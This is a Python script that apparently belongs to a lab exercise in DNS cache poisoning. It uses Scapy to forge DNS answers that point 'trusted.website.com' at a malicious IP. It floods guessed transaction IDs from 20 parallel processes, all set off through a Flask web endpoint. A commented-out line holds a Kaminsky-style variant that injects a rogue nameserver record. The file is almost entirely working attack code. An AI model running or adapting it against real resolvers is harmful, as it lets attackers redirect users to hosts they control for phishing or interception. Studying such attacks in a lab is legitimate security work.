from scapy.all import *
import multiprocessing as mp
from flask import Flask, request

app = Flask(__name__)
src_ip = "192.168.0.100"
dst_ip = "192.168.0.200"

src_port = 53
dst_port = 6666

website = "trusted.website.com"
mal_ip = "192.168.0.151"
dnswebsite ="dnswebsite.website.com"
# precompute standard object
response = (IP(dst=dst_ip, src=src_ip)/UDP(dport=dst_port, sport=src_port)/DNS(id=1, qr=1,
            aa=1, qd=DNSQR(qname=website), an=DNSRR(rrname=website, ttl=604769, rdata=mal_ip)))

# kaminsky
# response=(IP(dst=src_ip, src=dst_ip)/UDP(dport=ip.sport,sport=ip.dport)/DNS(id=1, qr=1, aa=1, qd=DNSQR(qname=website), ns=DNSRR(rrname=website, type='NS', ttl=604769, rdata=dnswebsite), ar=DNSRR(rrname=dnswebsite, type='A', ttl=604769, rdata="192.168.0.150")))

# list of messages
dns_layer = response[DNS]

s = conf.L3socket()


def attack(start):
  for i in range(start, start + 500, 1):
    dns_layer.id = i
    s.send(response)
  print("Finished")


@app.route('/', methods=['GET'])
def start_attack():
  qid = int(request.args.get('start_qid'))
  start_time = time.time()
  mp.set_start_method('spawn')
  for i in range(0, 20, 1):
    mp.Process(target=attack, args=(qid,)).start()
    qid += 500

  end_time = time.time()
  
  
  return f"Packet from QID: {request.args.get('start_qid')} to QID: {qid} sended in {end_time-start_time}"


if __name__ == "__main__":
  app.run(debug = True, host = '0.0.0.0', port = 42069)
